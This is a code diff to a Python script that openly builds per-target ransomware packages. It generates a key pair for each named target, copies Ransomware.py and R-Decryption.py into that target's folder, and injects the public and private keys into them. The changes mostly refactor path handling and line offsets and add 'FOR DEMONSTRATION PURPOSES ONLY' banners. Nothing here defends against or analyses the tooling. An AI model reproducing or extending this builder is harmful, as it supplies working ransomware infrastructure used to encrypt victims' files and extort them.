@@ -7,16 +7,27 @@ from GenAsymKeys import GenAsymKeys
 from shutil import copyfile
 from stat import *
 
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
+
 print("\nCURRENT LIST OF TARGETS:\n")
 
-home = os.getcwd()
+#get the directory that this file script is in
+cwd = os.getcwd()
 
-targets = glob.glob(os.path.join(home, 'Targets', '*'))
+#change this path if you want your targets folder to go elsewhere
+targets_path = os.path.join(cwd, 'Targets')
+
+targets = glob.glob(os.path.join(targets_path, '*'))
+
 for path in targets:
     print("\t" + path)
 
 name = raw_input("\nName of the new target?: ")
-file_path = os.path.join(home, 'Targets', name)
+
+file_path = os.path.join(targets_path, name)
 
 GenAsymKeys(file_path,name)
 
@@ -42,16 +53,16 @@ priv_key = f.read()
 f.close()
 
 rw_dir_d = os.path.join(rw_dir, 'R-Decryption.py')
-copyfile(os.path.join(home, 'R-Decryption.py'), rw_dir_d)
+copyfile(os.path.join(cwd, 'R-Decryption.py'), rw_dir_d)
 
 rw_dir_e = os.path.join(rw_dir, 'Ransomware.py')
-copyfile(os.path.join(home, 'Ransomware.py'), rw_dir_e)
+copyfile(os.path.join(cwd, 'Ransomware.py'), rw_dir_e)
 
 f = open(rw_dir_d, "r")
 contents = f.readlines()
 f.close()
 
-contents.insert(47, "    priv_key = \"\"\"" +  '    '.join(priv_key.splitlines(True)) + "\"\"\"\n\n")
+contents.insert(55, "    priv_key = \"\"\"" +  '    '.join(priv_key.splitlines(True)) + "\"\"\"\n\n")
 
 f = open(rw_dir_d, "w")
 contents = "".join(contents)
@@ -63,9 +74,14 @@ f = open(rw_dir_e, "r")
 contents = f.readlines()
 f.close()
 
-contents.insert(102, "    public_key = \"\"\"" +  '    '.join(pub_key.splitlines(True)) + "\"\"\"\n\n")
+contents.insert(116, "    public_key = \"\"\"" +  '    '.join(pub_key.splitlines(True)) + "\"\"\"\n\n")
 
 f = open(rw_dir_e, "w")
 contents = "".join(contents)
 f.write(contents)
 f.close()
+
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
